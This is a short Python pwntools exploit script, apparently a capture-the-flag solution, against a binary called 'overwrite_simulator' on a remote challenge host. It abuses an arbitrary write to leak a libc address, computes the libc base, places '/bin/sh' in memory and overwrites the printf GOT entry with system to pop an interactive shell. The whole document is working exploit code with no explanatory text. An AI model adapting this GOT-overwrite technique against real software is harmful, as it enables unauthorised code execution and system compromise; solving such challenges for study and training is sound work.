import pwn
pwn.context.terminal = ['tmux', 'splitw', '-h']
elf = pwn.context.binary = pwn.ELF("./overwrite_simulator")
libc = pwn.ELF("./libc.so.6")
if pwn.args.GDB:
    io = pwn.gdb.debug(elf.path, gdbscript='c\n')
elif pwn.args.REMOTE:
    io = pwn.remote("gc1.eng.run", 30164)
else:
    io = elf.process()


def overwrite(addr, val):
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b": ", str(addr))
    io.sendlineafter(b": ", val)


def leak():
    io.sendlineafter(b">>", b"2")
    io.recvuntil(b"A"*24)
    leak = io.recvuntil(b"-", drop=True)
    return leak


overwrite(0x404068, b"A"*8)
overwrite(0x404070, b"A"*8)
overwrite(0x404078, b"A"*8)
libc_leak = pwn.unpack(leak(), 'all')
pwn.log.success("LIBC Leak: "+hex(libc_leak))
libc.address = libc_leak - 0x1ec6a0
pwn.log.success("LIBC Base: "+hex(libc.address))
overwrite(0x404068, b"/bin/sh\0")
overwrite(elf.got.printf, pwn.p64(libc.sym.system))
io.interactive()
